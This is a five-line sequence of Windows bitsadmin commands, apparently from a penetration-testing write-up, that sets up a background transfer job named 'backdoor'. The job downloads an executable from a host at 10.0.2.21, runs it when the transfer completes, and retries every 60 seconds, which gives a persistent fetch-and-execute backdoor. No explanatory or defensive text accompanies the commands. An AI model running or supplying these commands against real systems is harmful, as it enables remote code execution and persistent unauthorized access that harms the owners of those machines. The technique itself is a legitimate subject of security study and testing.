bitsadmin /create backdoor
bitsadmin /addfile backdoor "http://10.0.2.21/pentestlab.exe"  "C:\pentestlab.exe"
bitsadmin /SetNotifyCmdLine backdoor C:\pentestlab.exe NUL
bitsadmin /SetMinRetryDelay "backdoor" 60
bitsadmin /resume backdoor